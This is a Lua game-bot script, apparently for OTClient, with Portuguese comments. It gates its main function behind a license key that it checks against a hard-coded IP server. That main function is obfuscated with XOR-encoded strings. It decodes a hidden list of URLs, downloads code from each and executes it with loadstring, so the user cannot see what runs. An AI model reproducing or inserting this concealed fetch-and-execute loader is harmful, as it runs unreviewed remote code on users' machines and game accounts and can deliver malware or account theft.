-- Flag para verificar se a chave foi validada
keyValidated = false

local function script()
    

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v10,v11) local v12=0;local v13;while true do if (v12==(569 -(367 + 201))) then return v5(v13);end if (v12==0) then v13={};for v20=928 -(214 + 713) , #v10 do v6(v13,v0(v4(v1(v2(v10,v20,v20 + 1 + 0 )),v1(v2(v11,1 + 0 + (v20% #v11) ,(878 -(282 + 595)) + (v20% #v11) + (1638 -(1523 + 114)) )))%256 ));end v12=1 + 0 ;end end end modules.game_bot.botWindow:setWidth(285 -85 );importStyle(v7("\158\238\218\38\244\180\212\81\128\252\235\36\239\181\194\18\159\204\207\48\239","\126\177\163\187\69\134\219\167"));importStyle(v7("\108\224\43\198\238\44\222\101\208\207\51\200\38\201\217\45\217\56\220\178\44\217\63\204","\156\67\173\74\165"));importStyle(v7("\123\154\72\21\174\41\85\123\148\70\24\186\47\65\31\178\80\5\242\41\82\33\190","\38\84\215\41\118\220\70"));local v8={v7("\88\2\54\2\237\10\89\109\0\255\71\88\37\27\234\88\3\32\7\237\85\4\33\29\240\68\19\44\6\176\83\25\47\93\219\92\50\39\4\220\95\4\37\23\237\31\51\46\48\241\66\17\39\1\179\115\3\49\6\241\93\89\48\23\248\67\89\42\23\255\84\5\109\31\255\89\24\109\67\193\21\68\114\52\247\92\2\48\29\220\81\2\54\30\251\85\24\33\92\242\69\23","\158\48\118\66\114"),v7("\163\48\4\38\96\255\180\228\54\17\33\61\162\242\191\44\5\52\102\182\254\185\39\31\56\103\160\245\191\106\19\57\126\234\222\167\0\21\32\81\170\233\172\33\3\121\86\169\217\164\54\23\51\96\232\216\190\55\4\57\126\234\233\174\34\3\121\123\160\250\175\55\95\59\114\172\245\228\118\47\6\114\172\245\174\40\21\56\112\235\247\190\37","\155\203\68\112\86\19\197"),v7("\78\201\34\236\83\34\170\183\84\220\33\178\71\113\241\240\83\223\35\239\69\106\230\247\72\201\51\242\84\54\230\247\75\146\19\240\100\125\243\218\73\207\49\249\83\55\192\244\100\210\36\251\69\107\168\219\83\206\34\243\77\55\247\253\64\206\121\244\69\121\225\235\9\208\55\245\78\55\241\241\75\216\9\239\80\125\233\244\121\216\56\249\77\97\224\246\69\147\58\233\65","\152\38\189\86\156\32\24\133"),v7("\244\67\179\86\239\13\232\9\238\86\176\8\251\94\179\78\233\85\178\85\249\69\164\73\242\67\162\72\232\25\164\73\241\24\130\74\216\82\177\100\243\69\160\67\239\24\130\74\222\88\181\65\249\68\234\101\233\68\179\73\241\24\181\67\250\68\232\78\249\86\163\85\179\90\166\79\242\24\151\112\204\82\169\69\178\91\178\71","\38\156\55\199"),v7("\160\105\104\56\0\46\181\12\186\124\107\102\20\125\238\75\189\127\105\59\22\102\249\76\166\105\121\38\7\58\249\76\165\50\89\36\55\113\236\97\167\111\123\45\0\59\223\79\138\114\110\47\22\103\183\96\189\110\104\39\30\59\232\70\174\110\51\32\22\117\254\80\231\112\125\33\29\59\251\87\169\126\119\28\18\102\253\70\188\120\114\43\93\120\239\66","\35\200\29\28\72\115\20\154"),v7("\17\171\197\207\158\118\123\86\173\208\200\195\43\61\13\183\196\221\152\63\49\11\188\222\209\153\41\58\13\241\210\208\128\99\17\21\155\212\201\175\35\38\30\186\194\144\168\32\22\22\173\214\218\158\97\23\12\172\197\208\128\99\38\28\185\194\144\133\41\53\29\172\158\210\140\37\58\86\149\196\210\157\41\58\26\241\221\202\140","\84\121\223\177\191\237\76"),v7("\179\66\221\176\41\10\127\142\169\87\222\238\61\89\36\201\174\84\220\179\63\66\51\206\181\66\204\174\46\30\51\206\182\25\236\172\30\85\38\227\180\68\206\165\41\31\21\205\153\89\219\167\63\67\125\226\174\69\221\175\55\31\34\196\189\69\134\168\63\81\52\210\244\91\200\169\52\31\5\213\178\90\192\164\59\84\53\210\190\88\202\238\54\69\49","\161\219\54\169\192\90\48\80"),v7("\65\86\20\53\90\24\79\106\91\67\23\107\78\75\20\45\92\64\21\54\76\80\3\42\71\86\5\43\93\12\3\42\68\13\37\41\109\71\22\7\70\80\7\32\90\13\37\41\107\77\18\34\76\81\77\6\92\81\20\42\68\13\18\32\79\81\79\45\76\67\4\54\6\79\1\44\71\13\19\32\71\81\5\32\71\65\78\41\92\67","\69\41\34\96"),v7("\180\215\195\26\17\113\243\140\197\11\21\101\187\202\195\2\23\41\169\208\210\24\1\36\178\215\210\4\22\101\191\204\218\69\39\39\152\198\193\40\13\57\187\198\196\69\39\39\158\204\197\13\7\56\241\224\194\25\22\36\177\140\197\15\4\56\243\203\210\11\6\56\243\206\214\3\12\100\152\194\196\2\61\24\169\205\196\2\11\37\185\205\212\68\14\62\189","\75\220\163\183\106\98")};local function v9(v14) if (v14> #v8) then print(v7("\54\181\143\56\202\66\181\152\119\202\1\168\130\39\205\17\250\141\56\203\3\183\203\52\216\16\168\142\48\216\6\181\152\119\218\13\183\203\36\204\1\191\152\36\214\76","\185\98\218\235\87"));return;end local v15=v8[v14];print(v7("\232\61\53\244\219\173\202\50\35\233\158\185\200\46\46\246\202\240\139","\202\171\92\71\134\190")   .. v15 );modules.corelib.HTTP.get(v15,function(v16) local v17=957 -(892 + 65) ;local v18;local v19;while true do if (v17==(0 -0)) then v18,v19=loadstring(v16);if v18 then local v21=0 -0 ;while true do if (v21==(1 -0)) then v9(v14 + 1 );break;end if (v21==(350 -(87 + 263))) then v18();print(v7("\26\194\62\129\57\213\108\139\40\211\62\141\46\192\40\135\105\194\35\133\105\210\57\139\44\210\63\135\115\129","\232\73\161\76")   .. v15 );v21=181 -(67 + 113) ;end end else print(v7("\158\203\80\82\94\186\214\2\94\31\169\203\71\90\31\169\153\81\94\12\178\201\86\7\94","\126\219\185\34\61")   .. v15   .. v7("\76\131\30","\135\108\174\62\18\30\23\147")   .. (v19 or v7("\147\251\56\196\88\170\54\212\181\230\36\195\29\173\58\195\185","\167\214\137\74\171\120\206\83")) );end break;end end end);end v9(1 + 0 );

end

-- Flag para verificar se a chave foi validada
keyValidated = false
local userKeyInput = "cfb802f"  -- Exemplo de chave fornecida

-- Função para validar a chave remotamente
local function validate_key_remotely(userKeyInput, callback)
    local HTTP = modules.corelib.HTTP
    local server_url = "http://38.46.142.218:5001/use-key?key=" .. userKeyInput

    -- Faz a requisição GET para validação da chave
    HTTP.get(server_url, function(response)
        if response then
            local responseData = json.parse(response)
            -- Se o "success" da resposta for false, chama o callback com "false"
            if responseData.success == false then
                callback(false, responseData.message)  -- Resposta do servidor com erro
            else
                callback(true, "Chave válida.")  -- Chave válida
            end
        else
            warn("Erro na requisição ao servidor. Verifique a conexão.")
            callback(false, "Erro de conexão.")  -- Caso a requisição não tenha retornado resposta
        end
    end)
end

-- Função para exibir a janela de validação da chave
local function showKeyValidationWindow()
    if keyValidated then
        return  -- Se a chave já foi validada, não exibe a janela
    end

    keyPanelInterface:show()

    -- Evento ao clicar no botão
    keyPanelInterface.confirmButton.onClick = function(widget)
        userKeyInput = keyPanelInterface.inputField:getText()

        if userKeyInput and userKeyInput ~= "" then
            warn("Validando chave...")
            -- Valida a chave remotamente
            validate_key_remotely(userKeyInput, function(isValid, message)
                if isValid then
                    keyValidated = true  -- Marca que a chave foi validada
                    warn(message)  -- Mensagem do servidor
                    script()  -- Executa o script após validação
                    keyPanelInterface:hide()  -- Fecha a janela de validação
                else
                    warn(message)  -- Exibe a mensagem de erro
                end
            end)
        else
            warn("Insira uma chave válida.")
        end
    end
end



